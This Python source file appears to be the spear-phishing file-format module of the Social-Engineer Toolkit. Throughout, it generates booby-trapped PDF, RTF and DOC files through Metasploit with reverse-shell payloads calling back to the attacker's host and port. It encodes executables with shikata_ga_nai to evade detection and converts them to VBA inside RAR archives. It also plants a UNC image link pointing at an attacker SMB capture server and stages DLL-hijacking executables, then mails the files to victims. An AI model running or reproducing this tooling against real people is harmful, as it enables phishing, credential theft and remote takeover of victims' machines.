#!/usr/bin/python
## PDF spear phishing attack here

import subprocess
import re
import sys
import os
import socket
import pexpect
import time
from src.core.setcore import *
from src.core.dictionaries import *
from src.core.menu.text import *

me = mod_name()
definepath=os.getcwd()
define_version = get_version()
users_home = os.getenv("HOME")

# metasploit path
meta_path=meta_path()

print meta_path

# define if we need apache or not for dll hijacking
# define if use apache or not
apache=0

# open set_config
apache_check=file("/etc/setoolkit/set.config","r").readlines()

# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
    # strip \r\n
    line=line.rstrip()
    # if apache is turned on get things ready
    match=re.search("APACHE_SERVER=ON",line)
    # if its on lets get apache ready
    if match:
        for line2 in apache_check:
            # set the apache path here
            match2=re.search("APACHE_DIRECTORY=", line2)
            if match2:
                line2=line2.rstrip()
                apache_path=line2.replace("APACHE_DIRECTORY=","")
                apache=1
		if os.path.isdir(apache_path + "/html"): apache_path = apache_path + "/html"

###################################################
#        USER INPUT: SHOW PAYLOAD MENU            #
###################################################
inputpdf=""
target=""
exploit = "INVALID"
while exploit == "INVALID":
    debug_msg(me,"printing 'src.core.menu.text.create_payloads_menu'",5)
    show_payload_menu1 = create_menu(create_payloads_text, create_payloads_menu)
    exploit = raw_input(setprompt(["4"], ""))
    print "\n"

    # Do conditional checks for the value of 'exploit', which should be a number
    # Handle any additional tasks before doing the dictionary lookup and
    # converting the user returned value to the metasploit string
    # here we specify if its a pdf or rtf

    if exploit == 'exit':
        exit_set()

    if exploit == "":
        exploit='1'        # 'SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)'

    if exploit == '3':     #'Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow'
        outfile=("template.doc")

    if exploit == '4':     #'Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)'
        outfile=("template.rtf")
        target=("TARGET=1")

    if exploit == "5":
        outfile = ("template.mov")

    if exploit != '3' and exploit != '4' and exploit !="17":
        outfile=("template.pdf")


    debug_msg(me,'current input was read as: %s' % exploit,3)
    exploit=ms_attacks(exploit)
    debug_msg(me,'value was translated to: %s' % exploit,3)

    if exploit == "INVALID":
        print_warning("that choice is invalid...please try again or press ctrl-c to Cancel.")
        time.sleep(2)

# 'exploit' has been converted to the string by now, so we need to
#  evaluate the string instead of the user input number from here on...
if exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe" or exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs":
    print_info("Default payload creation selected. SET will generate a normal PDF with embedded EXE.")
    print """
    1. Use your own PDF for attack
    2. Use built-in BLANK PDF for attack\n"""

    choicepdf = raw_input(setprompt(["4"], ""))

    if choicepdf == 'exit':
        exit_set()

    if choicepdf == '1':
        # define if user wants to use their own pdf or built in one
        inputpdf=raw_input(setprompt(["4"], "Enter path to your pdf [blank-builtin]"))
        # if blank, then default to normal pdf
        if inputpdf == "":
            # change to default SET pdf
            print_info("Defaulting to BLANK PDF built into SET...")
            inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
        # if no file exists defalt this
        if not os.path.isfile(inputpdf):
            print_warning("Unable to find PDF, defaulting to blank PDF.")
            inputpdf= definepath + "/src/core/msf_attacks/form.pdf"

    if choicepdf == '2':
        inputpdf= definepath + "/src/core/msf_attacks/form.pdf"

    if choicepdf == "":
        inputpdf= definepath + "/src/core/msf_attacks/form.pdf"

exploit_counter=0

if exploit == "dll_hijacking" or exploit == "unc_embed":
    exploit_counter=1

if exploit_counter == 0:

    ###################################################
    #        USER INPUT: SHOW PAYLOAD MENU 3          #
    ###################################################
    debug_msg(me,"printing 'src.core.menu.text.payload_menu_3'",5)
    show_payload_menu3 = create_menu(payload_menu_3_text, payload_menu_3)
    payload=raw_input(setprompt(["4"], ""))
    noencode=0

    if payload == 'exit':
        exit_set()

    if payload == "" : payload="2"
    if payload == '4' or payload == '5' or payload == '6':
        noencode=1

    payload=ms_payload_3(payload)


    # imported from central, grabs ip address
    rhost=grab_ipaddress()

    # SET LPORT
    lport=raw_input(setprompt(["4"], "Port to connect back on [443]"))

    # if blank default to 443
    if lport == "":
        lport="443"
        print_info("Defaulting to port 443...")

    # SET FILE OUTPATH
    # /root/.msf4/local/msf.pdf
    filename_code = outfile
    outpath=(users_home + "/.msf4/local/" + outfile)
    print_info("Generating fileformat exploit...")
    # START THE EXE TO VBA PAYLOAD
    if exploit != 'custom/exe/to/vba/payload':
        output = setdir + "/%s" % (outfile)
	if os.path.isfile(setdir + "/template.pdf"):
		os.remove(setdir + "/template.pdf")
	if os.path.isfile(users_home + "/.msf4/local/template.pdf"):
		os.remove(users_home + "/.msf4/local/template.pdf")

	filewrite = file(setdir + "/template.rc", "w")
	filewrite.write("use exploit/windows/fileformat/adobe_pdf_embedded_exe\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" % (rhost,lport,inputpdf,output))
	filewrite.close()
	child = pexpect.spawn("%smsfconsole -r %s/template.rc" % (meta_path, setdir))
	a = 1
	while a == 1:
		if os.path.isfile(setdir + "/template.pdf"):
		        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
			a = 2 #break
		else:
			print_status("Waiting for payload generation to complete...")
			if os.path.isfile(users_home + "/.msf4/local/" + outfile):
				subprocess.Popen("cp %s/.msf4/local/%s %s" % (users_home, outfile,setdir), shell=True)
			time.sleep(3)

        print_status("Payload creation complete.")
        time.sleep(1)
        print_status("All payloads get sent to the %s directory" % (outfile))
    if exploit == 'custom/exe/to/vba/payload':
        # Creating Payload here
        # if not 64 specify raw output and filename of vb1.exe
        if noencode == 0:
            execute1=("raw")
            payloadname=("vb1.exe")
        if noencode == 1:
            execute1=("exe")
            payloadname=("vb.exe")
        subprocess.Popen("%smsfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True)
        if noencode == 0:
            subprocess.Popen("%smsfvenom -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True)
        # Create the VB script here
        subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True)
        print_info("Raring the VBS file.")
        subprocess.Popen("rar a %s/template.rar %s/template.vbs" % (setdir,setdir), shell=True)

    # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
    filewrite=file(setdir + "/payload.options","w")
    filewrite.write(payload+" "+rhost+" "+lport)
    filewrite.close()
    if exploit != "dll_hijacking":
        if not os.path.isfile(setdir + "/fileformat.file"):
            sys.path.append("src/phishing/smtp/client/")
            debug_msg(me,"importing 'src.phishing.smtp.client.smtp_client'",1)
            try: reload(smtp_client)
            except: import smtp_client

# start the unc_embed attack stuff here
if exploit == "unc_embed":
    rhost=grab_ipaddress
    import string,random
    def random_string(minlength=6,maxlength=15):
        length=random.randint(minlength,maxlength)
        letters=string.ascii_letters+string.digits
        return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string()
    filewrite=file(setdir + "/unc_config", "w")
    filewrite.write("use server/capture/smb\n")
    filewrite.write("exploit -j\r\n\r\n")
    filewrite.close()
    filewrite=file(setdir + "/template.doc", "w")
    filewrite.write(r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' %(rhost,rand_gen))
    filewrite.close()
    sys.path.append("src/phishing/smtp/client/")
    debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'",1)
    try: reload(smtp_client)
    except: import smtp_client

# start the dll_hijacking stuff here
if exploit == "dll_hijacking":
    sys.path.append("src/core/payloadgen")
    debug_msg(me, "importing 'src.core.payloadgen.create_payloads'",1)
    try: reload(create_payloads)
    except: import create_payloads

    sys.path.append("src/webattack/dll_hijacking")
    debug_msg(me, "importing 'src.webattack.dll_hijacking.hijacking'",1)
    try: reload(hijacking)
    except: import hijacking

    # if we are not using apache
    if apache == 0:
        if not os.path.isfile("%s/fileformat.file" % (setdir)):
    #        try:
            filewrite=file(setdir + "/attack_vector","w")
            filewrite.write("hijacking")
            filewrite.close()
            filewrite=file(setdir + "/site.template","w")
            filewrite.write("TEMPLATE=CUSTOM")
            filewrite.close()
            time.sleep(1)
            subprocess.Popen("mkdir %s/web_clone;cp src/html/msf.exe %s/web_clone/x" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            child=pexpect.spawn("python src/html/web_server.py")
    #        except: child.close()
    # if we are using apache
    if apache == 1:
        subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()

    if os.path.isfile(setdir + "/meta_config"):
        # if we aren't using the infectious method then do normal routine
        if not os.path.isfile("%s/fileformat.file" % (setdir)):
            print_info("This may take a few to load MSF...")
            try:
                child1=pexpect.spawn("%smsfconsole -L -r %s/meta_config" % (meta_path,setdir))
            except:
                try:
                    child1.close()
                except: pass

    # get the emails out
    # if we aren't using the infectious method then do the normal routine
    if not os.path.isfile("%s/fileformat.file" % (setdir)):
        sys.path.append("src/phishing/smtp/client/")
        debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'",1)
        try: reload(smtp_client)
        except: import smtp_client
        try:
            child1.interact()
        except:
            if apache == 0:
                try:
                    child.close()
                    child1.close()
                except: pass
